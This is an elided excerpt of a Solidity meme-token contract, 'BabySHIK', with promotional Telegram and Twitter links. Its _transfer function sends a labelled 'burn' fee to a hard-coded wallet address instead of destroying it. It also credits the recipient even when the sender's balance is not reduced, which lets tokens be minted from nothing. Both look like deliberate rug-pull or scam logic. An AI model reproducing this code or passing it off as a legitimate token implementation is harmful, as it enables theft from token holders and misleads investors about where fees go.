...
// Submitted for Telegram: https://t.me/babyshikokuinu_official
// submitted for Twitter: https://twitter.com/baby_shikoku
...
contract  BabySHIK  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0xd8E8B8Bc0E12f7F9e6408Ad72Db748b9Fa397073] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0xd8E8B8Bc0E12f7F9e6408Ad72Db748b9Fa397073, _bruntoken);
        }
